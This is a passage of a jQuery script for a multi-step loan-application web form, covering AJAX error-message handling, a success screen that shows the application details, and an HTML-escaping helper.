                        $.each(xhr.responseJSON.data.errors, function(field, msg) {
                            showFieldError(field, msg);
                        });
                    }
                } else if (xhr.responseText) {
                    // Try parsing raw responseText as JSON
                    try {
                        var parsed = JSON.parse(xhr.responseText);
                        if (parsed && parsed.data && parsed.data.message) {
                            errorMsg = parsed.data.message;
                        }
                    } catch (e) {
                        // Response was not JSON (e.g. HTTP status text or server notice)
                        if (xhr.status === 403) {
                            errorMsg = 'Security session expired (403). Please refresh the page and try again.';
                        } else if (xhr.status === 404) {
                            errorMsg = 'Form submission endpoint not found (404). Please contact support.';
                        } else if (xhr.status === 500) {
                            errorMsg = 'A server error occurred (500). Please try again or contact support.';
                        }
                    }
                }

                if (!errorMsg) {
                    if (status === 'timeout') {
                        errorMsg = 'The request timed out. Please check your internet connection and try again.';
                    } else if (status === 'abort') {
                        errorMsg = 'The request was cancelled. Please try again.';
                    } else if (xhr.status === 0) {
                        errorMsg = 'Unable to reach the server. Please check your network connection or security settings and try again.';
                    } else {
                        errorMsg = 'Network or server error (' + (xhr.status ? 'HTTP ' + xhr.status : status) + '). Please try again.';
                    }
                }

                $globalError.text(errorMsg).show();
                $('html, body').animate({
                    scrollTop: $('#loan-card').offset().top - 80
                }, 300);
            },
            complete: function() {
                isSubmitting = false;
                $submitBtn.prop('disabled', false);
                $submitBtn.find('.btn-text-normal').show();
                $submitBtn.find('.btn-text-loading').hide();
            }
        });
    }

    /**
     * Display Final Success Screen (Matching Screenshot 5)
     */
    function displaySuccessScreen(data) {
        $('#finspire-multi-step-form').hide();
        $('.loan-steps-tracker').hide();
        $('.card-progress-bar').css('width', '100%');
        $('#card-step-heading').text(data.title || 'Application Submitted!');

        $('#success-title').text(data.title || 'Application Submitted!');
        $('#success-message').text(data.message || 'Your application has been received.');
        $('#success-ref').text(data.reference_no || '—');
        $('#success-name').text(((data.first_name || '') + ' ' + (data.last_name || '')).trim() || '—');
        $('#success-email').text(data.email || '—');
        $('#success-amount').text(data.loan_amount || '—');

        if (data.home_url) {
            $('#success-home-btn').attr('href', data.home_url);
        }
        if (data.home_btn_label) {
            $('#success-home-btn').text(data.home_btn_label);
        }

        $('#loan-success-screen').fadeIn(400);

        $('html, body').animate({
            scrollTop: $('#loan-card').offset().top - 90
        }, 400);
    }

    function escapeHtml(text) {
        if (!text) return '';
        var map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#039;'
        };
        return text.replace(/[&<>"']/g, function(m) { return map[m]; });
    }

})(jQuery);
